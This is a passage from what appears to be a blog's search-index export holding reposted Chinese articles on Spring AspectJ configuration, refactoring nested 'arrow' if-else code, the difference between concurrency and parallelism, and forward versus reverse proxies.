清单 7. AspectJ 的 pom 配置信息&lt;dependency&gt;
    &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt;
    &lt;artifactId&gt;spring-aspects&lt;&#x2F;artifactId&gt;
    &lt;version&gt;4.3.2.RELEASE&lt;&#x2F;version&gt;
&lt;&#x2F;dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt;
    &lt;artifactId&gt;aspectjrt&lt;&#x2F;artifactId&gt;
    &lt;version&gt;1.8.9&lt;&#x2F;version&gt;
&lt;&#x2F;dependency&gt;
&lt;plugin&gt;
    &lt;groupId&gt;org.codehaus.mojo&lt;&#x2F;groupId&gt;
    &lt;artifactId&gt;aspectj-maven-plugin&lt;&#x2F;artifactId&gt;
    &lt;version&gt;1.9&lt;&#x2F;version&gt;
    &lt;configuration&gt;
        &lt;showWeaveInfo&gt;true&lt;&#x2F;showWeaveInfo&gt;
        &lt;aspectLibraries&gt;
            &lt;aspectLibrary&gt;
                &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt;
                &lt;artifactId&gt;spring-aspects&lt;&#x2F;artifactId&gt;
            &lt;&#x2F;aspectLibrary&gt;
        &lt;&#x2F;aspectLibraries&gt;
    &lt;&#x2F;configuration&gt;
    &lt;executions&gt;
        &lt;execution&gt;
            &lt;goals&gt;
                &lt;goal&gt;compile&lt;&#x2F;goal&gt;
                &lt;goal&gt;test-compile&lt;&#x2F;goal&gt;
            &lt;&#x2F;goals&gt;
        &lt;&#x2F;execution&gt;
    &lt;&#x2F;executions&gt;
&lt;&#x2F;plugin&gt;

结束语通过本文的介绍，相信读者能够清楚的了解基于 @Transactional 注解的实现步骤，能够透彻的理解的 Spring 的内部实现机制，并有效的掌握相关使用注意事项，从而能够正确而熟练的使用基于 @Transactional 注解的事务管理方式。

转载：https://developer.ibm.com/zh/languages/java/articles/j-master-spring-transactional-use/

]]></content>
      <tags>
        <tag>Spring</tag>
        <tag>事务</tag>
      </tags>
  </entry>
  <entry>
    <title>如何重构“箭头型”代码</title>
    <url>/2021/03/20/%E5%A6%82%E4%BD%95%E9%87%8D%E6%9E%84%E2%80%9C%E7%AE%AD%E5%A4%B4%E5%9E%8B%E2%80%9D%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[本文主要起因是，一次在微博上和朋友关于嵌套好几层的if-else语句的代码重构的讨论（微博原文），在微博上大家有各式各样的问题和想法。按道理来说这些都是编程的基本功，似乎不太值得写一篇文章，不过我觉得很多东西可以从一个简单的东西出发，到达本质，所以，我觉得有必要在这里写一篇的文章。不一定全对，只希望得到更多的讨论，因为有了更深入的讨论才能进步。
文章有点长，我在文章最后会给出相关的思考和总结陈词，你可以跳到结尾。
所谓箭头型代码，基本上来说就是下面这个图片所示的情况。

那么，这样“箭头型”的代码有什么问题呢？看上去也挺好看的，有对称美。但是……
关于箭头型代码的问题有如下几个：
1）我的显示器不够宽，箭头型代码缩进太狠了，需要我来回拉水平滚动条，这让我在读代码的时候，相当的不舒服。
2）除了宽度外还有长度，有的代码的if-else里的if-else里的if-else的代码太多，读到中间你都不知道中间的代码是经过了什么样的层层检查才来到这里的。
总而言之，“箭头型代码”如果嵌套太多，代码太长的话，会相当容易让维护代码的人（包括自己）迷失在代码中，因为看到最内层的代码时，你已经不知道前面的那一层一层的条件判断是什么样的，代码是怎么运行到这里的，所以，箭头型代码是非常难以维护和Debug的。


微博上的案例 与 Guard ClausesOK，我们先来看一下微博上的那个示例，代码量如果再大一点，嵌套再多一点，你很容易会在条件中迷失掉（下面这个示例只是那个“大箭头”下的一个小箭头）
FOREACH(Ptr&lt;WfExpression&gt;, argument, node-&gt;arguments) &#123;
    int index &#x3D; manager-&gt;expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index !&#x3D; -1) &#123;
        auto type &#x3D; manager-&gt;expressionResolvings.Values()[index].type;
        if (! types.Contains(type.Obj())) &#123;
            types.Add(type.Obj());
            if (auto group &#x3D; type-&gt;GetTypeDescriptor()-&gt;GetMethodGroupByName(L&quot;CastResult&quot;, true)) &#123;
                int count &#x3D; group-&gt;GetMethodCount();
                for (int i &#x3D; 0; i &lt; count; i++) &#123; auto method &#x3D; group-&gt;GetMethod(i);
                    if (method-&gt;IsStatic()) &#123;
                        if (method-&gt;GetParameterCount() &#x3D;&#x3D; 1 &amp;&amp;
                            method-&gt;GetParameter(0)-&gt;GetType()-&gt;GetTypeDescriptor() &#x3D;&#x3D; description::GetTypeDescriptor&lt;DescriptableObject&gt;() &amp;&amp;
                            method-&gt;GetReturn()-&gt;GetTypeDescriptor() !&#x3D; description::GetTypeDescriptor&lt;void&gt;() ) &#123;
                            symbol-&gt;typeInfo &#x3D; CopyTypeInfo(method-&gt;GetReturn());
                            break;
                        &#125;
                    &#125;
                &#125;
            &#125;
        &#125;
    &#125;
&#125;

上面这段代码，可以把条件反过来写，然后就可以把箭头型的代码解掉了，重构的代码如下所示：
FOREACH(Ptr&lt;WfExpression&gt;, argument, node-&gt;arguments) &#123;
    int index &#x3D; manager-&gt;expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index &#x3D;&#x3D; -1)  continue;
    
    auto type &#x3D; manager-&gt;expressionResolvings.Values()[index].type;
    if ( types.Contains(type.Obj()))  continue;
    
    types.Add(type.Obj());

    auto group &#x3D; type-&gt;GetTypeDescriptor()-&gt;GetMethodGroupByName(L&quot;CastResult&quot;, true);
    if  ( ! group ) continue;
 
    int count &#x3D; group-&gt;GetMethodCount();
    for (int i &#x3D; 0; i &lt; count; i++) &#123; auto method &#x3D; group-&gt;GetMethod(i);
        if (! method-&gt;IsStatic()) continue;
       
        if ( method-&gt;GetParameterCount() &#x3D;&#x3D; 1 &amp;&amp;
               method-&gt;GetParameter(0)-&gt;GetType()-&gt;GetTypeDescriptor() &#x3D;&#x3D; description::GetTypeDescriptor&lt;DescriptableObject&gt;() &amp;&amp;
               method-&gt;GetReturn()-&gt;GetTypeDescriptor() !&#x3D; description::GetTypeDescriptor&lt;void&gt;() ) &#123;
            symbol-&gt;typeInfo &#x3D; CopyTypeInfo(method-&gt;GetReturn());
            break;
        &#125;
    &#125;
&#125;

这种代码的重构方式叫 Guard Clauses

Martin Fowler 的 Refactoring 的网站上有相应的说明《Replace Nested Conditional with Guard Clauses》。

Coding Horror 上也有一篇文章讲了这种重构的方式 —— 《Flattening Arrow Code》

StackOverflow 上也有相关的问题说了这种方式 —— 《Refactor nested IF statement for clarity》


这里的思路其实就是，让出错的代码先返回，前面把所有的错误判断全判断掉，然后就剩下的就是正常的代码了。
抽取成函数微博上有些人说，continue 语句破坏了阅读代码的通畅，我觉得他们一定没有好好读这里面的代码，其实，我们可以看到，所有的 if 语句都是在判断是否出错的情况，所以，在维护代码的时候，你可以完全不理会这些 if 语句，因为都是出错处理的，而剩下的代码都是正常的功能代码，反而更容易阅读了。当然，一定有不是上面代码里的这种情况，那么，不用continue ，我们还能不能重构呢？
当然可以，抽成函数：
bool CopyMethodTypeInfo(auto &amp;method, auto &amp;group, auto &amp;symbol) 
&#123;
    if (! method-&gt;IsStatic()) &#123;
        return true;
    &#125;
    if ( method-&gt;GetParameterCount() &#x3D;&#x3D; 1 &amp;&amp;
           method-&gt;GetParameter(0)-&gt;GetType()-&gt;GetTypeDescriptor() &#x3D;&#x3D; description::GetTypeDescriptor&lt;DescriptableObject&gt;() &amp;&amp;
           method-&gt;GetReturn()-&gt;GetTypeDescriptor() !&#x3D; description::GetTypeDescriptor&lt;void&gt;() ) &#123;
        symbol-&gt;typeInfo &#x3D; CopyTypeInfo(method-&gt;GetReturn());
        return false;
    &#125;
    return true;
&#125;

void ExpressionResolvings(auto &amp;manager, auto &amp;argument, auto &amp;symbol) 
&#123;
    int index &#x3D; manager-&gt;expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index &#x3D;&#x3D; -1) return;
    
    auto type &#x3D; manager-&gt;expressionResolvings.Values()[index].type;
    if ( types.Contains(type.Obj())) return;

    types.Add(type.Obj());
    auto group &#x3D; type-&gt;GetTypeDescriptor()-&gt;GetMethodGroupByName(L&quot;CastResult&quot;, true);
    if  ( ! group ) return;

    int count &#x3D; group-&gt;GetMethodCount();
    for (int i &#x3D; 0; i &lt; count; i++) &#123; auto method &#x3D; group-&gt;GetMethod(i);
        if ( ! CopyMethodTypeInfo(method, group, symbol) ) break;
    &#125;
&#125;

...
...
FOREACH(Ptr&lt;WfExpression&gt;, argument, node-&gt;arguments) &#123;
    ExpressionResolvings(manager, arguments, symbol)
&#125;
...
...

你发出现，抽成函数后，代码比之前变得更容易读和更容易维护了。不是吗？
有人说：“如果代码不共享，就不要抽取成函数！”，持有这个观点的人太死读书了。函数是代码的封装或是抽象，并不一定用来作代码共享使用，函数用于屏蔽细节，让其它代码耦合于接口而不是细节实现，这会让我们的代码更为简单，简单的东西都能让人易读也易维护。这才是函数的作用。
嵌套的 if 外的代码微博上还有人问，原来的代码如果在各个 if 语句后还有要执行的代码，那么应该如何重构。比如下面这样的代码。
&#x2F;&#x2F;原版
for(....) &#123;
    do_before_cond1()
    if (cond1) &#123;
        do_before_cond2();
        if (cond2) &#123;
            do_before_cond3();
            if (cond3) &#123;
                do_something();
            &#125;
            do_after_cond3();
        &#125;
        do_after_cond2();
    &#125;
    do_after_cond1();
&#125;

上面这段代码中的那些 do_after_condX() 是无论条件成功与否都要执行的。所以，我们拉平后的代码如下所示：
&#x2F;&#x2F;重构第一版
for(....) &#123;
    do_before_cond1();
    if ( !cond1 ) &#123;
        do_after_cond1();
        continue
    &#125; 
    do_after_cond1();

    do_before_cond2();
    if ( !cond2 ) &#123; 
        do_after_cond2();
        continue;
    &#125;
    do_after_cond2();

    do_before_cond3();
    if ( !cond3 ) &#123;
        do_after_cond3();
        continue;
    &#125;
    do_after_cond3();

    do_something();  
&#125;

你会发现，上面的 do_after_condX 出现了两份。如果 if 语句块中的代码改变了某些do_after_condX依赖的状态，那么这是最终版本。
但是，如果它们之前没有依赖关系的话，根据 DRY 原则，我们就可以只保留一份，那么直接掉到 if 条件前就好了，如下所示：
&#x2F;&#x2F;重构第二版
for(....) &#123;
    do_before_cond1();
    do_after_cond1();
    if ( !cond1 ) continue;
 
    do_before_cond2();
    do_after_cond2();
    if ( !cond2 ) continue;

    do_before_cond3();
    do_after_cond3();
    if ( !cond3 ) continue;

    do_something();  
&#125;

此时，你会说，我靠，居然，改变了执行的顺序，把条件放到 do_after_condX() 后面去了。这会不会有问题啊？
其实，你再分析一下之前的代码，你会发现，本来，cond1 是判断 do_before_cond1() 是否出错的，如果有成功了，才会往下执行。而 do_after_cond1() 是无论如何都要执行的。从逻辑上来说，do_after_cond1()其实和do_before_cond1()的执行结果无关，而 cond1 却和是否去执行 do_before_cond2() 相关了。如果我把断行变成下面这样，反而代码逻辑更清楚了。
//重构第三版
&#x2F;&#x2F;重构第三版
for(....) &#123;

    do_before_cond1();
    do_after_cond1();


    if ( !cond1 ) continue;  &#x2F;&#x2F; &lt;-- cond1 成了是否做第二个语句块的条件
    do_before_cond2();
    do_after_cond2();

    if ( !cond2 ) continue; &#x2F;&#x2F; &lt;-- cond2 成了是否做第三个语句块的条件
    do_before_cond3();
    do_after_cond3();

    if ( !cond3 ) continue; &#x2F;&#x2F;&lt;-- cond3 成了是否做第四个语句块的条件
    do_something(); 
 
&#125;

于是乎，在未来维护代码的时候，维护人一眼看上去就明白，代码在什么时候会执行到哪里。 这个时候，你会发现，把这些语句块抽成函数，代码会干净的更多，再重构一版：
//重构第四版
&#x2F;&#x2F;重构第四版
bool do_func3() &#123;
   do_before_cond2();
   do_after_cond2();
   return cond3;
&#125;

bool do_func2() &#123;
   do_before_cond2();
   do_after_cond2();
   return cond2;
&#125;

bool do_func1() &#123;
   do_before_cond1();
   do_after_cond1();
   return cond1;
&#125;

&#x2F;&#x2F; for-loop 你可以重构成这样
for (...) &#123;
    bool cond &#x3D; do_func1();
    if (cond) cond &#x3D; do_func2();
    if (cond) cond &#x3D; do_func3();
    if (cond) do_something();
&#125;

&#x2F;&#x2F; for-loop 也可以重构成这样
for (...) &#123;
    if ( ! do_func1() ) continue;
    if ( ! do_func2() ) continue;
    if ( ! do_func3() ) continue;
    do_something();
&#125;

上面，我给出了两个版本的for-loop，你喜欢哪个？我喜欢第二个。这个时候，因为for-loop里的代码非常简单，就算你不喜欢 continue ，这样的代码阅读成本已经很低了。
状态检查嵌套接下来，我们再来看另一个示例。下面的代码的伪造了一个场景——把两个人拉到一个一对一的聊天室中，因为要检查双方的状态，所以，代码可能会写成了“箭头型”。
int ConnectPeer2Peer(Conn *pA, Conn* pB, Manager *manager)
&#123;
    if ( pA-&gt;isConnected() ) &#123;
        manager-&gt;Prepare(pA);
        if ( pB-&gt;isConnected() ) &#123;
            manager-&gt;Prepare(pB);
            if ( manager-&gt;ConnectTogther(pA, pB) ) &#123;
                pA-&gt;Write(&quot;connected&quot;);
                pB-&gt;Write(&quot;connected&quot;);
                return S_OK;
            &#125;else&#123;
                return S_ERROR;
            &#125;

        &#125;else &#123;
            pA-&gt;Write(&quot;Peer is not Ready, waiting...&quot;);
            return S_RETRY;
        &#125;
    &#125;else&#123;
        if ( pB-&gt;isConnected() ) &#123;
            manager-&gt;Prepare();
            pB-&gt;Write(&quot;Peer is not Ready, waiting...&quot;);
            return S_RETRY;
        &#125;else&#123;
            pA-&gt;Close();
            pB-&gt;Close();
            return S_ERROR;
        &#125;
    &#125;
    &#x2F;&#x2F;Shouldn&#39;t be here!
    return S_ERROR;
&#125;

重构上面的代码，我们可以先分析一下上面的代码，说明了，上面的代码就是对 PeerA 和 PeerB 的两个状态 “连上”， “未连上” 做组合 “状态” （注：实际中的状态应该比这个还要复杂，可能还会有“断开”、“错误”……等等状态）， 于是，我们可以把代码写成下面这样，合并上面的嵌套条件，对于每一种组合都做出判断。这样一来，逻辑就会非常的干净和清楚。
int ConnectPeer2Peer(Conn *pA, Conn* pB, Manager *manager)
&#123;
    if ( pA-&gt;isConnected() ) &#123;
        manager-&gt;Prepare(pA);
    &#125;

    if ( pB-&gt;isConnected() ) &#123;
        manager-&gt;Prepare(pB);
    &#125;

    &#x2F;&#x2F; pA &#x3D; YES &amp;&amp; pB &#x3D; NO
    if (pA-&gt;isConnected() &amp;&amp; ! pB-&gt;isConnected()  ) &#123;
        pA-&gt;Write(&quot;Peer is not Ready, waiting&quot;);
        return S_RETRY;
    &#x2F;&#x2F; pA &#x3D; NO &amp;&amp; pB &#x3D; YES
    &#125;else if ( !pA-&gt;isConnected() &amp;&amp; pB-&gt;isConnected() ) &#123;
        pB-&gt;Write(&quot;Peer is not Ready, waiting&quot;);
        return S_RETRY;
    &#x2F;&#x2F; pA &#x3D; YES &amp;&amp; pB &#x3D; YES
    &#125;else if (pA-&gt;isConnected() &amp;&amp; pB-&gt;isConnected()  ) &#123;
        if ( ! manager-&gt;ConnectTogther(pA, pB) ) &#123;
            return S_ERROR;
        &#125;
        pA-&gt;Write(&quot;connected&quot;);
        pB-&gt;Write(&quot;connected&quot;);
        return S_OK;
    &#125;

    &#x2F;&#x2F; pA &#x3D; NO, pB &#x3D; NO
    pA-&gt;Close();
    pB-&gt;Close();
    return S_ERROR;
&#125;

延伸思考对于 if-else 语句来说，一般来说，就是检查两件事：错误 和 状态。
检查错误对于检查错误来说，使用 Guard Clauses 会是一种标准解，但我们还需要注意下面几件事：
1）当然，出现错误的时候，还会出现需要释放资源的情况。你可以使用 goto fail; 这样的方式，但是最优雅的方式应该是C++面向对象式的 RAII 方式。
2）以错误码返回是一种比较简单的方式，这种方式有很一些问题，比如，如果错误码太多，判断出错的代码会非常复杂，另外，正常的代码和错误的代码会混在一起，影响可读性。所以，在更为高组的语言中，使用 try-catch 异常捕捉的方式，会让代码更为易读一些。
检查状态对于检查状态来说，实际中一定有更为复杂的情况，比如下面几种情况：
1）像TCP协议中的两端的状态变化。
2）像shell各个命令的命令选项的各种组合。
3）像游戏中的状态变化（一棵非常复杂的状态树）。
4）像语法分析那样的状态变化。
对于这些复杂的状态变化，其本上来说，你需要先定义一个状态机，或是一个子状态的组合状态的查询表，或是一个状态查询分析树。
写代码时，代码的运行中的控制状态或业务状态是会让你的代码流程变得混乱的一个重要原因，重构“箭头型”代码的一个很重要的工作就是重新梳理和描述这些状态的变迁关系。
总结好了，下面总结一下，把“箭头型”代码重构掉的几个手段如下：
1）使用 Guard Clauses 。 尽可能的让出错的先返回， 这样后面就会得到干净的代码。
2）把条件中的语句块抽取成函数。 有人说：“如果代码不共享，就不要抽取成函数！”，持有这个观点的人太死读书了。函数是代码的封装或是抽象，并不一定用来作代码共享使用，函数用于屏蔽细节，让其它代码耦合于接口而不是细节实现，这会让我们的代码更为简单，简单的东西都能让人易读也易维护，写出让人易读易维护的代码才是重构代码的初衷！
3）**对于出错处理，使用try-catch异常处理和RAII机制**。返回码的出错处理有很多问题，比如：A) 返回码可以被忽略，B) 出错处理的代码和正常处理的代码混在一起，C) 造成函数接口污染，比如像atoi()这种错误码和返回值共用的糟糕的函数。
4）对于多个状态的判断和组合，如果复杂了，可以使用“组合状态表”，或是状态机加Observer的状态订阅的设计模式。这样的代码即解了耦，也干净简单，同样有很强的扩展性。
5） 重构“箭头型”代码其实是在帮你重新梳理所有的代码和逻辑，这个过程非常值得为之付出。重新整思路去想尽一切办法简化代码的过程本身就可以让人成长。
（全文完）

转载说明
原文作者：陈皓
原文地址：https://coolshell.cn/articles/17757.html

]]></content>
      <tags>
        <tag>重构代码</tag>
      </tags>
  </entry>
  <entry>
    <title>并发与并行</title>
    <url>/2021/04/09/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/</url>
    <content><![CDATA[OK，如果你还在为并发（concurrency）和并行（parallelism）这两个词的区别而感到困扰，那么这篇文章就是写给你看的。搞这种词语辨析到底有什么意义？其实没什么意义，但是有太多人在混用错用这两个词（比如遇到的某门课的老师）。不论中文圈还是英文圈，即使已经有数不清的文章在讨论并行 vs 并发，却极少有能讲清楚的。让一个讲不清楚的人来解释，比不解释更可怕。比如我随便找了个网上的解释：

前者是逻辑上的同时发生（simultaneous），而后者是物理上的同时发生．
并发性 (concurrency)，又称共行性，是指能处理多个同时性活动的能力，并发事件之间不一定要同一时刻发生。
并行 (parallelism) 是指同时发生的两个并发事件，具有并发的含义，而并发则不一定并行。
来个比喻：并发和并行的区别就是一个人同时吃三个馒头和三个人同时吃三个馒头。

看了之后，你懂了么？不懂，更晕了。写出这类解释的人，自己也是一知半解，却又把自己脑子里模糊的影像拿出来写成文章，让读者阅毕反而更加疑惑。当然也有可能他确实懂了，但是写出这种文字也不能算负责。至于本文，请相信，一定是准确的，我也尽量做到讲解清晰。
OK，下面进入正题，concurrency vs parallelism


让我们大声朗读下面这句话：
“并发” 指的是程序的结构，“并行” 指的是程序运行时的状态即使不看详细解释，也请记住这句话。下面来具体说说：
并行（parallelism）这个概念很好理解。所谓并行，就是同时执行的意思，无需过度解读。判断程序是否处于并行的状态，就看同一时刻是否有超过一个 “工作单位” 在运行就好了。所以，单线程永远无法达到并行状态。
要达到并行状态，最简单的就是利用多线程和多进程。但是 Python 的多线程由于存在著名的 GIL，无法让两个线程真正 “同时运行”，所以实际上是无法到达并行状态的。
并发（concurrency）要理解 “并发” 这个概念，必须得清楚，并发指的是程序的 “结构”。当我们说这个程序是并发的，实际上，这句话应当表述成 “这个程序采用了支持并发的设计”。好，既然并发指的是人为设计的结构，那么怎样的程序结构才叫做支持并发的设计？
**正确的并发设计的标准是：使多个操作可以在重叠的时间段内进行 (two tasks can start, run, and complete in overlapping time periods)**。
这句话的重点有两个。我们先看 “（操作）在重叠的时间段内进行” 这个概念。它是否就是我们前面说到的并行呢？是，也不是。并行，当然是在重叠的时间段内执行，但是另外一种执行模式，也属于在重叠时间段内进行。这就是协程。
使用协程时，程序的执行看起来往往是这个样子：

task1, task2 是两段不同的代码，比如两个函数，其中黑色块代表某段代码正在执行。注意，这里从始至终，在任何一个时间点上都只有一段代码在执行，但是，由于 task1 和 task2 在重叠的时间段内执行，所以这是一个支持并发的设计。与并行不同，单核单线程能支持并发。
经常看到这样一个说法，叫做并发执行。现在我们可以正确理解它。有两种可能：

 原本想说的是 “并行执行”，但是用错了词
 指多个操作可以在重叠的时间段内进行，即，真的并行，或是类似上图那样的执行模式。

我的建议是尽可能不使用这个词，容易造成误会，尤其是对那些并发并行不分的人。但是读到这里的各位显然能正确区分，所以下面为了简便，将使用并发执行这个词。
第二个重点是 “可以在重叠的时间段内进行”中的 “可以” 两个字。“可以”的意思是，正确的并发设计使并发执行成为可能，但是程序在实际运行时却不一定会出现多个任务执行时间段 overlap 的情形。比如：我们的程序会为每个任务开一个线程或者协程，只有一个任务时，显然不会出现多个任务执行时间段重叠的情况，有多个任务时，就会出现了。这里我们看到，并发并不描述程序执行的状态，它描述的是一种设计，是程序的结构，比如上面例子里 “为每个任务开一个线程” 的设计。并发设计和程序实际执行情况没有直接关联，但是正确的并发设计让并发执行成为可能。反之，如果程序被设计为执行完一个任务再接着执行下一个，那就不是并发设计了，因为做不到并发执行。
那么，如何实现支持并发的设计？两个字：拆分。
之所以并发设计往往需要把流程拆开，是因为如果不拆分也就不可能在同一时间段进行多个任务了。这种拆分可以是平行的拆分，比如抽象成同类的任务，也可以是不平行的，比如分为多个步骤。
并发和并行的关系
Different concurrent designs enable different ways to parallelize.

这句话来自著名的 talk: Concurrency is not parallelism。它足够 concise，以至于不需要过多解释。但是仅仅引用别人的话总是不太好，所以我再用之前文字的总结来说明：并发设计让并发执行成为可能，而并行是并发执行的一种模式。
最后，关于 Concurrency is not parallelism 这个 talk 再多说点。自从这个 talk 出来，直接引爆了一堆讨论并发 vs 并行的文章，并且无一例外提到这个 talk，甚至有的文章直接用它的 slide 里的图片来说明。比如这张：

以为我要解释这张图吗？NO。放这张图的唯一原因就是萌萌的 gopher。
再来张特写：

之前看到知乎上有个关于 go 为什么流行的问题，有个答案是 “logo 萌” 当时我就笑喷了。
好像跑题了，继续说这个 talk。和很多人一样，我也是看了这个 talk 才开始思考 concurrency vs parallesim 的问题。为了研究那一堆推小车的 gopher 到底是怎么回事，我花费了相当多的时间。实际上后来我更多地是通过网上的只言片语（比如 SO 的回答）和自己的思考弄清了这个问题，talk 并没有很大帮助。彻底明白之后再回过头来看这个 talk，确实相当不错，Andrew Gerrand 对这个问题的理解绝对够深刻，但是太不新手向了。最大问题在于，那一堆 gopher 的例子不够好，太复杂。Andrew Gerrand 花了大把时间来讲述不同的并发设计，但是作为第一次接触这个话题的人，在没有搞清楚并发并行区别的情况下就去研究推小车的 gopher，太难了。“Different concurrent designs enable different ways to parallelize” 这句总结很精辟，但也只有那些已经透彻理解的人才能领会，比如我和看到这里的读者，对新手来说就和经文一样难懂。总结下来一句话，不要一开始就去看这个视频，也不要花时间研究推小车的 gopher。Gopher is moe, but confusing.
2015.8.14 更新
事实上我之前的理解还是有错误。在《最近的几个面试》这篇文章里有提到。最近买了《七周七并发模型》这本书，发现其中有讲，在此摘录一下（英文版 p3~p4）：

Although there’s a tendency to think that parallelism means multiple cores, modern computers are parallel on many different levels. The reason why individual cores have been able to get faster every year, until recently, is that they’ve been using all those extra transistors predicted by Moore’s law in parallel, both at the bit and at the instruction level.
Bit-Level ParallelismWhy is a 32-bit computer faster than an 8-bit one? Parallelism. If an 8-bit computer wants to add two 32-bit numbers, it has to do it as a sequence of 8-bit operations. By contrast, a 32-bit computer can do it in one step, handling each of the 4 bytes within the 32-bit numbers in parallel. That’s why the history of computing has seen us move from 8- to 16-, 32-, and now 64-bit architectures. The total amount of benefit we’ll see from this kind of parallelism has its limits, though, which is why we’re unlikely to see 128-bit computers soon.
Instruction-Level ParallelismModern CPUs are highly parallel, using techniques like pipelining, out-of-order execution, and speculative execution.As programmers, we’ve mostly been able to ignore this because, despite the fact that the processor has been doing things in parallel under our feet, it’s carefully maintained the illusion that everything is happening sequentially. This illusion is breaking down, however. Processor designers are no longer able to find ways to increase the speed of an individual core. As we move into a multicore world, we need to start worrying about the fact that instructions aren’t handled sequentially. We’ll talk about this more in Memory Visibility, on page ?.
Data ParallelismData-parallel (sometimes called SIMD, for “single instruction, multiple data”) architectures are capable of performing the same operations on a large quantity of data in parallel. They’re not suitable for every type of problem, but they can be extremely effective in the right circumstances. One of the applications that’s most amenable to data parallelism is image processing. To increase the brightness of an image, for example, we increase the brightness of each pixel. For this reason, modern GPUs (graphics processing units) have evolved into extremely powerful data-parallel processors.
Task-Level ParallelismFinally, we reach what most people think of as parallelism—multiple processors. From a programmer’s point of view, the most important distinguishing feature of a multiprocessor architecture is the memory model, specifically whether it’s shared or distributed.

最关键的一点是，计算机在不同层次上都使用了并行技术。之前我讨论的实际上仅限于 Task-Level 这一层，在这一层上，并行无疑是并发的一个子集。但是并行并非并发的子集，因为在 Bit-Level 和 Instruction-Level 上的并行不属于并发——比如引文中举的 32 位计算机执行 32 位数加法的例子，同时处理 4 个字节显然是一种并行，但是它们都属于 32 位加法这一个任务，并不存在多个任务，也就根本没有并发。
所以，正确的说法是这样：并行指物理上同时执行，并发指能够让多个任务在逻辑上交织执行的程序设计
按照我现在的理解，并发针对的是 Task-Level 及更高层，并行则不限。这也是它们的区别。

原文地址：https://laike9m.com/blog/huan-zai-yi-huo-bing-fa-he-bing-xing,61/

]]></content>
      <tags>
        <tag>并发</tag>
        <tag>并行</tag>
      </tags>
  </entry>
  <entry>
    <title>反向代理和正向代理的区别</title>
    <url>/2021/03/12/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[一 什么是代理代理其实就是一个中介，A 和 B 本来可以直连，中间插入一个 C，C 就是中介。刚开始的时候，代理多数是帮助内网 client 访问外网 server 用的后来出现了反向代理，&quot;反向&quot; 这个词在这儿的意思其实是指方向相反，即代理将来自外网客户端的请求转发到内网服务器，从外到内。


二 正向代理正向代理类似一个跳板机，代理访问外部资源。
比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了。

正向代理的用途：

访问原来无法访问的资源，如 google

可以做缓存，加速访问资源

对客户端访问授权，上网进行认证

代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息


三 反向代理反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个服务器

反向代理的作用：

保证内网的安全，阻止 web 攻击，大型网站，通常将反向代理作为公网访问地址，Web 服务器是内网

负载均衡，通过反向代理服务器来优化网站的负载


四 总结正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端.
反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端
看图理解一：

看图理解二：

正向代理中，proxy 和 client 同属一个 LAN，对 server 透明；反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。实际上 proxy 在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把后出现的那种代理方式叫成了反向代理
总结：正向代理: 买票的黄牛反向代理: 租房的代理

转载：https://www.cnblogs.com/taostaryu/p/10547132.html

]]></content>
      <tags>
        <tag>代理</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
</search>
